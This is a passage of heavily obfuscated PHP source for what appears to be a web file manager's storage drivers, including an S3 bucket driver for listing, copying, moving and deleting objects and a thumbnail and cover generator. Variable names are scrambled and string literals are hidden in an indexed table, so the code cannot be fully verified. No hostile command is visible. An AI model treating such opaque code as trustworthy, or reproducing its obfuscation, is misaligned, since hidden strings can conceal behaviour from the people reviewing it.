$³ŸÕœú[$Ë ¡ Ï¬[171]]; } echo $ƒ»Ğê¸; $â”œ¥ó¾ += $ÚèÕÍ‘†; if ($ÚèÕÍ‘† == $€ñîş ) { $â”œ¥ó¾ = $Ş‘íÎ + 1; } if ($¿½Ãê®) { $˜‚–¯…– = intval(1000 * 1000 * (timeFloat() - $˜‰ŞèâÜ)); $åø°òèú = $¿½Ãê® - $˜‚–¯…–; if ($åø°òèú > 5) { usleep($åø°òèú); } } } } public function fileOutServer($–ÀÒëŸ¬, $‹×î¤ğ¿ = false, $Ğä—ÂØá = false, $­õª–çˆ = '') { $this->fileOut($–ÀÒëŸ¬, $‹×î¤ğ¿, $Ğä—ÂØá, $­õª–çˆ); } public function fileOutLink($çÆ·­©ğ) { header($_SERVER[´È¥ö†ö][175] . $çÆ·­©ğ); die; } public function cacheMethod($¿¡ÙõÁï, $Úõú¹ˆÛ, $ï¡±œ­„ = null) { $şéôÙºì =& $_SERVER[´È¥ö†ö]; static $’¡ù¡„ = array(); $¥êˆëîÊ = $Úõú¹ˆÛ ? ltrim($this->getPathOuter($Úõú¹ˆÛ), $şéôÙºì[8]) : $şéôÙºì[12]; $æØÃ®Ø = $şéôÙºì[176] . $¿¡ÙõÁï . $şéôÙºì[177] . rtrim($¥êˆëîÊ, $şéôÙºì[8]); if (is_null($¿¡ÙõÁï)) { $’¡ù¡„ = array(); return; } if (is_null($Úõú¹ˆÛ)) { foreach ($’¡ù¡„ as $æØÃ®Ø => $¿»ŞüñÔ) { if (!strstr($æØÃ®Ø, $şéôÙºì[176] . $¿¡ÙõÁï . $şéôÙºì[178])) { continue; } unset($’¡ù¡„[$æØÃ®Ø]); } return; } if (!is_null($ï¡±œ­„)) { $’¡ù¡„[$æØÃ®Ø] = $ï¡±œ­„; return; } $×¯„ÒÒ = isset($’¡ù¡„[$æØÃ®Ø]) ? $’¡ù¡„[$æØÃ®Ø] : null; if (!is_null($×¯„ÒÒ)) { return $×¯„ÒÒ; } $×¯„ÒÒ = $this->{$¿¡ÙõÁï}($Úõú¹ˆÛ); $’¡ù¡„[$æØÃ®Ø] = $×¯„ÒÒ; return $×¯„ÒÒ; } public function cacheMethodInfoSet($À…ïÑÌò, $¿­Áï¥‹, $ŞøŸ†Â¹ = false) { $¼›ğ·»• =& $_SERVER[´È¥ö†ö]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¼›ğ·»•[179], $À…ïÑÌò, $¿­Áï¥‹); $this->cacheMethod($¼›ğ·»•[180], $À…ïÑÌò, $¿­Áï¥‹ ? !1 : !0); if (is_array($ŞøŸ†Â¹)) { $this->cacheMethod($¼›ğ·»•[181], $À…ïÑÌò, $ŞøŸ†Â¹); } } public function fileOutImage($È”‡…‹¯, $äµ¤ïÚİ = 250) { $—‰ñËŒÕ =& $_SERVER[´È¥ö†ö]; set_timeout(); if (substr($È”‡…‹¯, 0, 4) == $—‰ñËŒÕ[152]) { $this->fileOutLink($È”‡…‹¯); } $³‰Ñó§ë = $this->info($È”‡…‹¯); $ƒ×êµ»› = !1; $ÁºÖŸ£ = isset($GLOBALS[$—‰ñËŒÕ[182]]) ? $GLOBALS[$—‰ñËŒÕ[182]] : array(); if ($ÁºÖŸ£ && $ÁºÖŸ£[$—‰ñËŒÕ[183]] == $³‰Ñó§ë[$—‰ñËŒÕ[87]]) { $³‰Ñó§ë = $ÁºÖŸ£; $Ä«ã©”Ì = $³‰Ñó§ë[$—‰ñËŒÕ[184]]; if ($Ä«ã©”Ì && isset($Ä«ã©”Ì[$—‰ñËŒÕ[185]])) { if ($Ä«ã©”Ì[$—‰ñËŒÕ[185]] <= $äµ¤ïÚİ && $Ä«ã©”Ì[$—‰ñËŒÕ[186]] <= $äµ¤ïÚİ) { $ƒ×êµ»› = !0; } } } if ($³‰Ñó§ë[$—‰ñËŒÕ[79]] <= 1024 * 50 || $ƒ×êµ»› || !function_exists($—‰ñËŒÕ[187]) || $³‰Ñó§ë[$—‰ñËŒÕ[169]] == $—‰ñËŒÕ[188]) { return $this->fileOut($È”‡…‹¯, !1, $³‰Ñó§ë[$—‰ñËŒÕ[32]]); } $İàï´ˆ‘ = kodIO::hashPath($³‰Ñó§ë); $æÃ¡òËæ = "\x63\x6f\x76\145\x72\137{$İàï´ˆ‘}\x5f{$äµ¤ïÚİ}\x2e\160\156\x67"; $ìÒùõÈÍ = IO_PATH_SYSTEM_TEMP . $—‰ñËŒÕ[189]; $Ææµ´í = IO::infoFullSimple($ìÒùõÈÍ); $Åú‡¶›¾ = $Ææµ´í && is_array($Ææµ´í) ? $Ææµ´í[$—‰ñËŒÕ[87]] : $—‰ñËŒÕ[12]; if (!$Åú‡¶›¾) { $Åú‡¶›¾ = IO::mkdir($ìÒùõÈÍ); } if ($³‰Ñó§ë[$—‰ñËŒÕ[190]] == $—‰ñËŒÕ[191] && isset($³‰Ñó§ë[$—‰ñËŒÕ[192]]) && $³‰Ñó§ë[$—‰ñËŒÕ[192]] == kodIO::sourceID($Åú‡¶›¾)) { $ô¸›º·À = $³‰Ñó§ë[$—‰ñËŒÕ[193]]; if ($äµ¤ïÚİ <= 500) { $§Ê–ÆâÕ = preg_replace($—‰ñËŒÕ[194], $—‰ñËŒÕ[195], $³‰Ñó§ë[$—‰ñËŒÕ[32]]); $ô¸›º·À = IO::fileNameExist($Åú‡¶›¾, $§Ê–ÆâÕ); } return IO::fileOut(KodIO::make($ô¸›º·À), !1, $³‰Ñó§ë[$—‰ñËŒÕ[32]]); } $û¶¤–Î = IO::fileNameExist($Åú‡¶›¾, $æÃ¡òËæ); if ($û¶¤–Î) { return IO::fileOut(KodIO::make($û¶¤–Î), !1, $³‰Ñó§ë[$—‰ñËŒÕ[32]]); } if ($äµ¤ïÚİ > 1000) { $this->makeImageCover($Åú‡¶›¾, $È”‡…‹¯, $æÃ¡òËæ, $äµ¤ïÚİ); $this->makeImageCover($Åú‡¶›¾, $È”‡…‹¯, "\143\157\166\x65\x72\137{$İàï´ˆ‘}\x5f\x32\x35\x30\x2e\x70\156\147", 250); $û¶¤–Î = IO::fileNameExist($Åú‡¶›¾, $æÃ¡òËæ); if ($û¶¤–Î) { return IO::fileOut(KodIO::make($û¶¤–Î), !1, $³‰Ñó§ë[$—‰ñËŒÕ[32]]); } die; } if (!kodIO::allowCover($³‰Ñó§ë)) { return $this->fileOut($È”‡…‹¯, !1, $³‰Ñó§ë[$—‰ñËŒÕ[32]]); } $—öúäıå = Cache::get($æÃ¡òËæ); if ($—öúäıå == $—‰ñËŒÕ[196] || $—öúäıå == $—‰ñËŒÕ[197]) { echo $—öúäıå; die; } Cache::set($æÃ¡òËæ, $—‰ñËŒÕ[197], 60); $À®ìŠ¡— = array($Åú‡¶›¾, $³‰Ñó§ë[$—‰ñËŒÕ[87]], $æÃ¡òËæ, $äµ¤ïÚİ); $ˆÛâÑ¸ˆ = $—‰ñËŒÕ[198] . $³‰Ñó§ë[$—‰ñËŒÕ[79]] . $—‰ñËŒÕ[199] . $æÃ¡òËæ . $—‰ñËŒÕ[200] . $³‰Ñó§ë[$—‰ñËŒÕ[32]] . $—‰ñËŒÕ[201] . $³‰Ñó§ë[$—‰ñËŒÕ[87]]; TaskQueue::add($—‰ñËŒÕ[202], $À®ìŠ¡—, $ˆÛâÑ¸ˆ, $æÃ¡òËæ); } public function makeImageCover($Œ¾ÌÃì€, $¥£ÙÅÃÓ, $ ¦ƒòã, $ıÊ¹î˜Ğ) { $¦õ…¸Îß =& $_SERVER[´È¥ö†ö]; if (IO::fileNameExist($Œ¾ÌÃì€, $ ¦ƒòã)) { return $¦õ…¸Îß[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ªµ©Å¶ô = DATA_THUMB . $ ¦ƒòã; del_file($ªµ©Å¶ô); $€ÍˆàİÓ = IO::copy($¥£ÙÅÃÓ, TEMP_FILES, !1, $ ¦ƒòã); if (!@file_exists($€ÍˆàİÓ)) { return $¦õ…¸Îß[204]; } ImageThumb::createThumb($€ÍˆàİÓ, $ªµ©Å¶ô, $ıÊ¹î˜Ğ, $ıÊ¹î˜Ğ * 10); if (@file_exists($ªµ©Å¶ô)) { Cache::remove($ ¦ƒòã); return IO::move($ªµ©Å¶ô, $Œ¾ÌÃì€); } Cache::set($ ¦ƒòã, $¦õ…¸Îß[196], 600); del_file($ªµ©Å¶ô); return $¦õ…¸Îß[205] . $€ÍˆàİÓ . $¦õ…¸Îß[74]; } public function fileOutImageServer($ò³Î’†®, $øîÂ¡§ù = 250) { $this->fileOutImage($ò³Î’†®, $øîÂ¡§ù); } public function fileNameAuto($©ıÆ´×†, $Û¨‚„½Ñ, $‹‚·˜ˆÎ = REPEAT_RENAME, $“Ñß¯ã = false) { $ÎÕĞ”Ñ¡ =& $_SERVER[´È¥ö†ö]; $ùÔ˜ÔĞõ = $©ıÆ´×† === $ÎÕĞ”Ñ¡[12] ? $Û¨‚„½Ñ : rtrim($©ıÆ´×†, $ÎÕĞ”Ñ¡[8]) . $ÎÕĞ”Ñ¡[8] . $Û¨‚„½Ñ; if ($‹‚·˜ˆÎ == REPEAT_REPLACE || !$this->exist($ùÔ˜ÔĞõ) || $“Ñß¯ã && $‹‚·˜ˆÎ != REPEAT_RENAME_FOLDER) { return $Û¨‚„½Ñ; } if ($‹‚·˜ˆÎ == REPEAT_SKIP) { return !1; } $·‡ö£íå = $ÎÕĞ”Ñ¡[10] . get_path_ext($Û¨‚„½Ñ); $·‡ö£íå = $·‡ö£íå == $ÎÕĞ”Ñ¡[10] || $“Ñß¯ã ? $ÎÕĞ”Ñ¡[12] : $·‡ö£íå; $µéã•ğ« = 1; $‚ùÙâĞù = substr($Û¨‚„½Ñ, 0, strlen($Û¨‚„½Ñ) - strlen($·‡ö£íå)); $™ŒÀ›è× = $‚ùÙâĞù . "\50{$µéã•ğ«}\x29{$·‡ö£íå}"; while ($this->exist(rtrim($©ıÆ´×†, $ÎÕĞ”Ñ¡[8]) . $ÎÕĞ”Ñ¡[8] . $™ŒÀ›è×)) { $™ŒÀ›è× = $‚ùÙâĞù . "\50{$µéã•ğ«}\51{$·‡ö£íå}"; $µéã•ğ«++; } return $™ŒÀ›è×; } private function fileNameAutoList($“¶ù±„, $Ğ‹½ØË¦, $±¾ãŸì = false) { $ãÕØşÌ¸ =& $_SERVER[´È¥ö†ö]; $õó†Æõ = $this->listPath($“¶ù±„, !0); $õó†Æõ = array_merge($õó†Æõ[$ãÕØşÌ¸[85]], $õó†Æõ[$ãÕØşÌ¸[86]]); $±ùÖ«¾ = array_to_keyvalue($õó†Æõ, $ãÕØşÌ¸[12], $ãÕØşÌ¸[32]); $¼ğÓÚøú = $ãÕØşÌ¸[10] . get_path_ext($Ğ‹½ØË¦); $¼ğÓÚøú = $¼ğÓÚøú == $ãÕØşÌ¸[10] || $±¾ãŸì ? $ãÕØşÌ¸[12] : $¼ğÓÚøú; $½éÊÉ¥¶ = substr($Ğ‹½ØË¦, 0, strlen($Ğ‹½ØË¦) - strlen($¼ğÓÚøú)); $Ÿ£²€– = $½éÊÉ¥¶ . "\50\60\x29{$¼ğÓÚøú}"; for ($” ¨ÌÁÍ = 1; $” ¨ÌÁÍ <= count($±ùÖ«¾) + 1; $” ¨ÌÁÍ++) { $Ÿ£²€– = $½éÊÉ¥¶ . "\x28{$” ¨ÌÁÍ}\51{$¼ğÓÚøú}"; if (!in_array_not_case($Ÿ£²€–, $±ùÖ«¾)) { return $Ÿ£²€–; } } return $Ÿ£²€–; } public function listAllFiles($”„ßÉ›¿, $¡ÊôæªÓ) { $Ğ³àáÙ¾ =& $_SERVER[´È¥ö†ö]; if (empty($¡ÊôæªÓ)) { return array(); } $Å¢Ïôõá = array_keys($¡ÊôæªÓ); $˜ë¾±¥Â = array(); $”„ßÉ›¿ = trim($”„ßÉ›¿, $Ğ³àáÙ¾[8]); foreach ($¡ÊôæªÓ as $Å®ßŞğ => $ÀÌğ¯ĞÙ) { $µëŠ©‘ = ltrim(substr(trim($Å®ßŞğ, $Ğ³àáÙ¾[8]), strlen($”„ßÉ›¿)), $Ğ³àáÙ¾[8]); if (substr($Å®ßŞğ, -1) == $Ğ³àáÙ¾[8]) { $µëŠ©‘ = rtrim($µëŠ©‘, $Ğ³àáÙ¾[8]) . $Ğ³àáÙ¾[8]; } $˜ë¾±¥Â = array_merge($˜ë¾±¥Â, $this->slicePath($µëŠ©‘)); } $¾“ †Ã¶ = array(); foreach (array_unique($˜ë¾±¥Â) as $éöéÍªå) { $Ø½Âçùğ = array($Ğ³àáÙ¾[87] => $this->getPathOuter($Ğ³àáÙ¾[8] . $”„ßÉ›¿ . $Ğ³àáÙ¾[8] . $éöéÍªå), $Ğ³àáÙ¾[78] => 1, $Ğ³àáÙ¾[79] => 0); if (substr($éöéÍªå, -1) != $Ğ³àáÙ¾[8]) { $Ø½Âçùğ[$Ğ³àáÙ¾[78]] = 0; $¼°—³ıØ = $this->getPath($”„ßÉ›¿ . $Ğ³àáÙ¾[8] . $éöéÍªå); if (isset($¡ÊôæªÓ[$¼°—³ıØ])) { $æ©ÅæØá = $¡ÊôæªÓ[$¼°—³ıØ]; if (isset($æ©ÅæØá[$Ğ³àáÙ¾[79]])) { $Ø½Âçùğ[$Ğ³àáÙ¾[79]] = intval($æ©ÅæØá[$Ğ³àáÙ¾[79]]); } if (isset($æ©ÅæØá[$Ğ³àáÙ¾[206]])) { $Ø½Âçùğ[$Ğ³àáÙ¾[88]] = intval($æ©ÅæØá[$Ğ³àáÙ¾[206]]); } } } $¾“ †Ã¶[] = $Ø½Âçùğ; } return $¾“ †Ã¶; } public function slicePath($×Íœ±º) { $Ùõ×ÚÆ =& $_SERVER[´È¥ö†ö]; $³Š‹„á = explode($Ùõ×ÚÆ[8], trim($×Íœ±º, $Ùõ×ÚÆ[8])); $Ş„Ö«©ù = 0; do { ++$Ş„Ö«©ù; $ı«†ÎöÔ[] = implode($Ùõ×ÚÆ[8], array_slice($³Š‹„á, 0, $Ş„Ö«©ù)) . $Ùõ×ÚÆ[8]; } while ($Ş„Ö«©ù < count($³Š‹„á)); $ı«†ÎöÔ[count($³Š‹„á) - 1] = $×Íœ±º; return $ı«†ÎöÔ; } public function getHost() { $ıÇ±Çøè =& $_SERVER[´È¥ö†ö]; $¬³Õ È» = parse_url(trim($this->domain, $ıÇ±Çøè[8])); $Ğ•ıè› = isset($¬³Õ È»[$ıÇ±Çøè[207]]) ? $¬³Õ È»[$ıÇ±Çøè[207]] : http_type(); $è´Äöë = isset($¬³Õ È»[$ıÇ±Çøè[208]]) ? $¬³Õ È»[$ıÇ±Çøè[208]] : $¬³Õ È»[$ıÇ±Çøè[87]]; if (isset($¬³Õ È»[$ıÇ±Çøè[209]])) { $è´Äöë .= $ıÇ±Çøè[4] . $¬³Õ È»[$ıÇ±Çøè[209]]; } return $Ğ•ıè› . $ıÇ±Çøè[210] . $è´Äöë; } public function pathEncode($ó¥ĞŠ·”) { $í²”íñ =& $_SERVER[´È¥ö†ö]; return str_replace($í²”íñ[211], $í²”íñ[8], rawurlencode($ó¥ĞŠ·”)); } public function writeLog($Ø…èŒÒ = '', $ü û°î£ = false) { $û ùĞŠÉ =& $_SERVER[´È¥ö†ö]; $Š¦ÚŞÛ = in_array(ACTION, array($û ùĞŠÉ[212], $û ùĞŠÉ[213])); if (!$Š¦ÚŞÛ && !GLOBAL_DEBUG) { return; } $ËñÖœ¹¡ = $Ø…èŒÒ; static $ïÔ‘ÍšÑ = null; if (!$ïÔ‘ÍšÑ) { $ïÔ‘ÍšÑ = strtoupper($this->getType()); } $Ø…èŒÒ = $ïÔ‘ÍšÑ . $û ùĞŠÉ[214] . $Ø…èŒÒ; if ($ü û°î£) { $µÛ·Ä› = error_get_last(); if ($µÛ·Ä›) { $Ø…èŒÒ = array($Ø…èŒÒ, $µÛ·Ä›); } } write_log($Ø…èŒÒ, $û ùĞŠÉ[215]); if ($Š¦ÚŞÛ) { throw new Exception($ËñÖœ¹¡); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($å¥©ö–é) { set_timeout(); require_once SDK_DIR . $_SERVER[´È¥ö†ö][216]; parent::__construct(); $this->_init($å¥©ö–é); } public function _init($öĞäõ÷†) { $æÏ¹„‡ =& $_SERVER[´È¥ö†ö]; $this->config = $öĞäõ÷†; foreach ($öĞäõ÷† as $–Ûš£¼å => $Üù†¶Ô) { if (isset($this->{$–Ûš£¼å})) { $this->{$–Ûš£¼å} = $Üù†¶Ô; } } $this->endpoint = $öĞäõ÷†[$æÏ¹„‡[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $éëúÓò³ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($éëúÓò³, 0, 7) == $æÏ¹„‡[218]) { $éëúÓò³ = $æÏ¹„‡[219] . substr($éëúÓò³, 7); } $this->client->setEndpoint($éëúÓò³); if (in_array(ACTION, array($æÏ¹„‡[212], $æÏ¹„‡[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ËøµÒ´¦ = "\x76\64") { $this->signVer = $ËøµÒ´¦; $this->client->setSignVersion($ËøµÒ´¦); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ˆš¡§’) { return null; } } public function isBucketCors() { $Ú•ê¤ö =& $_SERVER[´È¥ö†ö]; $ ¸ƒ¸¸š = $this->getBucketCors(); if (!$ ¸ƒ¸¸š || !is_array($ ¸ƒ¸¸š)) { return !1; } if (!is_array($ ¸ƒ¸¸š[$Ú•ê¤ö[220]])) { $ ¸ƒ¸¸š[$Ú•ê¤ö[220]] = explode($Ú•ê¤ö[50], $ ¸ƒ¸¸š[$Ú•ê¤ö[220]]); } if ($ ¸ƒ¸¸š[$Ú•ê¤ö[221]] != $Ú•ê¤ö[222] || !in_array($Ú•ê¤ö[222], $ ¸ƒ¸¸š[$Ú•ê¤ö[220]])) { return !1; } $í¢ÅËœö = array_map($Ú•ê¤ö[223], $ ¸ƒ¸¸š[$Ú•ê¤ö[224]]); if (!is_array($í¢ÅËœö)) { $í¢ÅËœö = array(); } $ÏïüÄöó = array($Ú•ê¤ö[225], $Ú•ê¤ö[226], $Ú•ê¤ö[227], $Ú•ê¤ö[228], $Ú•ê¤ö[229]); $ºµŸª¼ = array_diff($ÏïüÄöó, $í¢ÅËœö); return empty($ºµŸª¼); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($—ùË‰‰Ÿ, $ÇÂĞ¸ºÕ = '', $˜ì„ØâÜ = REPEAT_RENAME) { $ÂÀ­‡Û = $this->setContent($—ùË‰‰Ÿ, $ÇÂĞ¸ºÕ); if ($ÂÀ­‡Û !== !1) { return $this->getPathOuter($—ùË‰‰Ÿ); } return !1; } public function mkdir($ìˆ¸†üÔ, $åñø£¯” = REPEAT_SKIP) { $áã•¯” =& $_SERVER[´È¥ö†ö]; if (empty($ìˆ¸†üÔ) && $ìˆ¸†üÔ !== $áã•¯”[230]) { return !1; } if ($åñø£¯” && $this->_isFolder($ìˆ¸†üÔ)) { return $this->getPathOuter($ìˆ¸†üÔ); } $šÕî˜•¼ = $this->setContent($ìˆ¸†üÔ, $áã•¯”[12], !0); if ($šÕî˜•¼ !== !1) { return $this->getPathOuter($ìˆ¸†üÔ); } return !1; } public function copyFile($ŞˆßÎ›¯, $¾œ¤æ”ô, $¶¼¡ÛÌ = array()) { $ˆÌœéËú =& $_SERVER[´È¥ö†ö]; $ğÉÙ·ƒ£ = $this->objectMeta($ŞˆßÎ›¯); if (!$ğÉÙ·ƒ£) { return !1; } if ($ğÉÙ·ƒ£[$ˆÌœéËú[79]] <= 1024 * 1024 * 200) { $ï§²¿Ê = $this->client->copyObject($this->bucket, $ŞˆßÎ›¯, $this->bucket, $¾œ¤æ”ô, $ˆÌœéËú[231], $¶¼¡ÛÌ); } else { $ï§²¿Ê = $this->client->multiCopyObject($this->bucket, $ŞˆßÎ›¯, $this->bucket, $¾œ¤æ”ô, $¶¼¡ÛÌ); } $ï§²¿Ê = $ï§²¿Ê ? $this->getPathOuter($¾œ¤æ”ô) : !1; return $ï§²¿Ê; } public function moveFile($åÚ‹ƒÌå, $¸ÔÈÕ») { if ($this->copyFile($åÚ‹ƒÌå, $¸ÔÈÕ»)) { $this->delFile($åÚ‹ƒÌå); return $this->getPathOuter($¸ÔÈÕ»); } return !1; } public function delFile($òÆ÷šó) { return $this->client->deleteObject($this->bucket, $òÆ÷šó); } public function delFolder($ÁİÛ±¢Ö) { $ğ™†ãÏµ =& $_SERVER[´È¥ö†ö]; if (!$this->exist($ÁİÛ±¢Ö)) { return !0; } $this->listItemCache = !1; $®ä¸­ƒ = $this->fileList($ÁİÛ±¢Ö); $this->listItemCache = !0; $­™´¨åˆ = trim($ÁİÛ±¢Ö, $ğ™†ãÏµ[8]) . $ğ™†ãÏµ[8]; if (!empty($ÁİÛ±¢Ö) && $ÁİÛ±¢Ö !== $ğ™†ãÏµ[230] && !in_array($­™´¨åˆ, $®ä¸­ƒ[$ğ™†ãÏµ[85]])) { $®ä¸­ƒ[$ğ™†ãÏµ[85]][] = $­™´¨åˆ; } $ÉÚ»á = $this->delByBatch($®ä¸­ƒ[$ğ™†ãÏµ[86]]); if (!$ÉÚ»á) { return !1; } $ÉÚ»á = $this->delByBatch($®ä¸­ƒ[$ğ™†ãÏµ[85]]); if (!$ÉÚ»á) { return !1; } return $this->delFile($­™´¨åˆ); } private function delByBatch($—İĞÉ) { foreach (array_chunk($—İĞÉ, 1000) as $ˆóê Õ) { $ü©åàÓ° = $this->client->deleteObjects($this->bucket, $ˆóê Õ); if (!$ü©åàÓ°) { return !1; } } return !0; } public function rename($÷Ó»µª, $õÁÅ›×) { return $this->renameObject($÷Ó»µª, $õÁÅ›×); } public function listPath($¡ŸËçŒ÷, $ÓàìÎƒ = false) { $½ôË“•× =& $_SERVER[´È¥ö†ö]; $îªËÍµÇ = $this->fileList($¡ŸËçŒ÷, $½ôË“•×[8], !0); foreach ($îªËÍµÇ[$½ôË“•×[85]] as $›Ÿ®¿™ => $º¯ãªÚÄ) { $îªËÍµÇ[$½ôË“•×[85]][$›Ÿ®¿™] = $this->folderInfo($º¯ãªÚÄ, $ÓàìÎƒ, $º¯ãªÚÄ); } foreach ($îªËÍµÇ[$½ôË“•×[86]] as $›Ÿ®¿™ => $º¯ãªÚÄ) { $îªËÍµÇ[$½ôË“•×[86]][$›Ÿ®¿™] = $this->fileInfo($º¯ãªÚÄ[$½ôË“•×[32]], $ÓàìÎƒ, $º¯ãªÚÄ); } return $îªËÍµÇ; } protected function infoChildren($ìÅøÏ”Ü, &$·È•¯×’) { $èÄÇ†í¬ =& $_SERVER[´È¥ö†ö]; $È†÷ä = $this->fileList($ìÅøÏ”Ü, $èÄÇ†í¬[12], !0); $·È•¯×’[$èÄÇ†í¬[81]] += count($È†÷ä[$èÄÇ†í¬[85]]); $·È•¯×’[$èÄÇ†í¬[80]] += count($È†÷ä[$èÄÇ†í¬[86]]); foreach ($È†÷ä[$èÄÇ†í¬[86]] as $’“¦—ã) { if (!$’“¦—ã || !$’“¦—ã[$èÄÇ†í¬[79]]) { continue; } $·È•¯×’[$èÄÇ†í¬[79]] += $’“¦—ã[$èÄÇ†í¬[79]]; } } private function fileInfo($¥­ƒ´Ü, $ñû•Ü¨€ = false, $€ƒÉ µ² = array()) { $Ğ€êØĞô =& $_SERVER[´È¥ö†ö]; $–¥äû¬Ò = array($Ğ€êØĞô[32] => $this->pathThis($¥­ƒ´Ü), $Ğ€êØĞô[87] => $this->getPathOuter($¥­ƒ´Ü), $Ğ€êØĞô[33] => $Ğ€êØĞô[232], $Ğ€êØĞô[169] => $this->ext($¥­ƒ´Ü), $Ğ€êØĞô[79] => isset($€ƒÉ µ²[$Ğ€êØĞô[79]]) ? $€ƒÉ µ²[$Ğ€êØĞô[79]] : 0); if ($ñû•Ü¨€) { return $–¥äû¬Ò; } $–¥äû¬Ò[$Ğ€êØĞô[233]] = $–¥äû¬Ò[$Ğ€êØĞô[88]] = 0; $–¥äû¬Ò[$Ğ€êØĞô[234]] = $–¥äû¬Ò[$Ğ€êØĞô[235]] = !0; if (empty($€ƒÉ µ²)) { $€ƒÉ µ² = $this->objectMeta($¥­ƒ´Ü); if (!$€ƒÉ µ²) { return $–¥äû¬Ò; } } if (isset($€ƒÉ µ²[$Ğ€êØĞô[236]]) && $€ƒÉ µ²[$Ğ€êØĞô[236]]) { $–¥äû¬Ò[$Ğ€êØĞô[237]] = $€ƒÉ µ²[$Ğ€êØĞô[236]]; } if (isset($€ƒÉ µ²[$Ğ€êØĞô[206]])) { $–¥äû¬Ò[$Ğ€êØĞô[88]] = $€ƒÉ µ²[$Ğ€êØĞô[206]]; } if (isset($€ƒÉ µ²[$Ğ€êØĞô[79]])) { $–¥äû¬Ò[$Ğ€êØĞô[79]] = $€ƒÉ µ²[$Ğ€êØĞô[79]]; } return $–¥äû¬Ò; } private function folderInfo($â¦ÊÏ²Â, $ì¼òÖ¶Á = false, $Õ³¥’Ä® = array()) { $¾„Û¯“² =& $_SERVER[´È¥ö†ö]; $¥§®•ï = array($¾„Û¯“²[32] => $this->pathThis($â¦ÊÏ²Â), $¾„Û¯“²[87] => $this->getPathOuter($¾„Û¯“²[8] . $â¦ÊÏ²Â), $¾„Û¯“²[33] => $¾„Û¯“²[78]); if ($ì¼òÖ¶Á) { return $¥§®•ï; } $¥§®•ï[$¾„Û¯“²[233]] = $¥§®•ï[$¾„Û¯“²[88]] = 0; $¥§®•ï[$¾„Û¯“²[234]] = $¥§®•ï[$¾„Û¯“²[235]] = !0; if ($â¦ÊÏ²Â == $¾„Û¯“²[12]) { return $¥§®•ï; } if (empty($Õ³¥’Ä®)) { $Õ³¥’Ä® = $this->objectMeta(trim($â¦ÊÏ²Â, $¾„Û¯“²[8]) . $¾„Û¯“²[8]); } if (isset($Õ³¥’Ä®[$¾„Û¯“²[206]])) { $¥§®•ï[$¾„Û¯“²[233]] = $Õ³¥’Ä®[$¾„Û¯“²[206]]; } return $¥§®•ï; } private function fileList($ËñµşÁ, $ßæ³¸ïû = '', $¬Ûş­³’ = 0) { $°ò”æ É =& $_SERVER[´È¥ö†ö]; $èß¦Èè­ = rtrim($ËñµşÁ, $°ò”æ É[8]) . $°ò”æ É[8]; $‰ çá°‚ = $this->listObjs($èß¦Èè­, null, null, $ßæ³¸ïû); if (!$‰ çá°‚) { return array($°ò”æ É[85] => array(), $°ò”æ É[86] => array()); } $ËÊ×—®É = $“Óâ˜÷İ = array(); foreach ($‰ çá°‚[$°ò”æ É[238]] as $Ô¡Åû“æ) { $ÏÂÀŒ• = $Ô¡Åû“æ[$°ò”æ É[32]]; if ($ÏÂÀŒ• == $èß¦Èè­) { continue; } $”´Íù = isset($Ô¡Åû“æ[$°ò”æ É[79]]) ? $Ô¡Åû“æ[$°ò”æ É[79]] : 0; $ØºÓ£Çà = $”´Íù == 0 && substr($ÏÂÀŒ•, strlen($ÏÂÀŒ•) - 1, 1) == $°ò”æ É[8] ? !0 : !1; $this->cacheMethodInfoSet($ÏÂÀŒ•, $ØºÓ£Çà, $Ô¡Åû“æ); if ($ØºÓ£Çà) { $ËÊ×—®É[] = $ÏÂÀŒ•; continue; } $“Óâ˜÷İ[] = $¬Ûş­³’ ? $Ô¡Åû“æ : $ÏÂÀŒ•; } foreach ($‰ çá°‚[$°ò”æ É[239]] as $Ô¡Åû“æ) { $ËÊ×—®É[] = $Ô¡Åû“æ[$°ò”æ É[32]]; $this->cacheMethodInfoSet($Ô¡Åû“æ[$°ò”æ É[32]], !0); } $this->cacheMethodInfoSet($ËñµşÁ, !0); return array($°ò”æ É[85] => $ËÊ×—®É, $°ò”æ É[86] => $“Óâ˜÷İ); } private function listObjs($¢úúççÅ, $»Ô†î· = null, $­Í°›™ = null, $£Áµ¼¶ = null) { $íí öŒã =& $_SERVER[´È¥ö†ö]; $¢úúççÅ = trim($¢úúççÅ, $íí öŒã[8]); $¨º¶ßôì = empty($¢úúççÅ) && $¢úúççÅ !== $íí öŒã[230] ? $íí öŒã[12] : $¢úúççÅ . $íí öŒã[8]; return $this->client->getBucket($this->bucket, $¨º¶ßôì, $»Ô†î·, $­Í°›™, $£Áµ¼¶, !0); } public function has($”—Şñúş, $×òŸÄßÆ = false, $İÀ­™ô = true) { $˜ş„½Ş¸ =& $_SERVER[´È¥ö†ö]; $”—Şñúş = trim($”—Şñúş, $˜ş„½Ş¸[8]); $Ô¨š°—Æ = empty($”—Şñúş) && $”—Şñúş !== $˜ş„½Ş¸[230] ? $˜ş„½Ş¸[12] : $”—Şñúş . $˜ş„½Ş¸[8]; $ƒ¡¢¹ñ = null; $«‹ÕÇ¦’ = 500; $Ùâ¥Éª¯ = $˜ş„½Ş¸[8]; $èõ×ÑÏ = $èˆåĞ÷İ = array(); while (!0) { $‰ŒßÁ’³ = $this->listObjs($”—Şñúş, $ƒ¡¢¹ñ, $«‹ÕÇ¦’, $Ùâ¥Éª¯); if (!$‰ŒßÁ’³) { break; } $ƒ¡¢¹ñ = $‰ŒßÁ’³[$˜ş„½Ş¸[240]]; $Š‹‰ñØ = $‰ŒßÁ’³[$˜ş„½Ş¸[238]]; $¾÷çµşÃ = $‰ŒßÁ’³[$˜ş„½Ş¸[239]]; if (empty($Š‹‰ñØ) && empty($¾÷çµşÃ)) { break; 